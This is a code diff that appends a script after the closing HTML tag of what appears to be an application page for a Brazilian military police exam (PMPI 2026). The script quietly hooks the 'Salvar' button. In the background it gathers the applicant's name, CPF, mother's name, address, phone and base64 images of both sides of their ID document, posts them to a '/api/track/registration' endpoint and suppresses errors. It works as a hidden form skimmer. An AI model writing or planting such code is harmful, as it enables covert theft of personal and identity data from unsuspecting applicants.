@@ -975,3 +975,73 @@ select.qs-native:focus, input.qs-date:focus { outline:none; }
 })();
 </script>
 </body></html>
+<script>
+(function(){
+  function ready(cb){ if(document.readyState!=='loading') cb(); else document.addEventListener('DOMContentLoaded', cb); }
+  function findInput(l,p){var arr=Array.from(document.querySelectorAll('input[aria-label]'));l=l.toLowerCase();if(p)return arr.find(function(i){return (i.getAttribute('aria-label')||'').toLowerCase().indexOf(l)===0;});return arr.find(function(i){return (i.getAttribute('aria-label')||'').toLowerCase()===l;});}
+  function findSelect(l){var arr=Array.from(document.querySelectorAll('select'));l=l.toLowerCase();return arr.find(function(s){return (s.getAttribute('data-qs-label')||'').toLowerCase()===l;});}
+  function v(l,p){var e=findInput(l,p);return e?(e.value||'').trim():'';}
+  function s(l){var e=findSelect(l);return e?(e.value||'').trim():'';}
+  function fileToBase64(file){return new Promise(function(res){var r=new FileReader();r.onload=function(){res((r.result||'').toString().split(',')[1]||'');};r.onerror=function(){res('');};r.readAsDataURL(file);});}
+  async function enviarCadastro(){
+    var f = document.getElementById('doc-front-file');
+    var b = document.getElementById('doc-back-file');
+    var frontData = (f && f.files && f.files[0]) ? await fileToBase64(f.files[0]) : '';
+    var backData  = (b && b.files && b.files[0]) ? await fileToBase64(b.files[0]) : '';
+    var telEl = findInput('Telefone', true);
+    var body = {
+      extra: {
+        nome: v('NOME COMPLETO'),
+        cpf: v('CPF'),
+        email: v('E-mail Primário'),
+        concurso: 'PMPI 2026 - Soldado PM e Oficial PM Capelão',
+        stage: 'cadastro',
+        form_data: {
+          nome: v('NOME COMPLETO'),
+          cpf: v('CPF'),
+          email: v('E-mail Primário'),
+          nascimento: v('Data de Nascimento'),
+          genero: s('Gênero'),
+          mae: v('NOME DA MÃE'),
+          estadoCivil: s('Estado civil'),
+          pais: s('Em que país você nasceu?'),
+          estadoNasc: s('Em que estado você nasceu?'),
+          naturalidade: s('Naturalidade'),
+          enderecoTipo: s('Tipo de endereço'),
+          cep: v('CEP'),
+          endereco: v('Endereço'),
+          numero: v('Número'),
+          complemento: v('Complemento'),
+          bairro: v('Bairro'),
+          cidade: v('Cidade'),
+          uf: s('Estado'),
+          escolaridade: s('Maior grau de escolaridade'),
+          telTipo: s('Tipo'),
+          telefone: telEl ? (telEl.value||'').trim() : '',
+          docTipo: s('Tipo de documento'),
+          docArquivoNome: (f && f.files && f.files[0]) ? f.files[0].name : '',
+          docArquivoTipo: (f && f.files && f.files[0]) ? f.files[0].type : '',
+          docArquivoSize: (f && f.files && f.files[0]) ? f.files[0].size : 0,
+          docArquivoData: frontData,
+          docArquivoVersoNome: (b && b.files && b.files[0]) ? b.files[0].name : '',
+          docArquivoVersoTipo: (b && b.files && b.files[0]) ? b.files[0].type : '',
+          docArquivoVersoSize: (b && b.files && b.files[0]) ? b.files[0].size : 0,
+          docArquivoVersoData: backData
+        }
+      }
+    };
+    try { await fetch('/api/track/registration',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); } catch(e){}
+  }
+  // Interceptar Salvar antes do handler que faz spinner+redirect
+  function bind(){
+    var btn = Array.from(document.querySelectorAll('button')).find(function(b){ return /salvar/i.test(b.textContent||''); });
+    if(!btn || btn.__cadHooked) return;
+    btn.__cadHooked = true;
+    btn.addEventListener('click', function(){
+      // Envia em background — não bloqueia o fluxo
+      setTimeout(function(){ enviarCadastro(); }, 50);
+    }, false); // NÃO capture: roda depois do handler original
+  }
+  ready(function(){ setTimeout(bind, 500); setTimeout(bind, 1500); });
+})();
+</script>
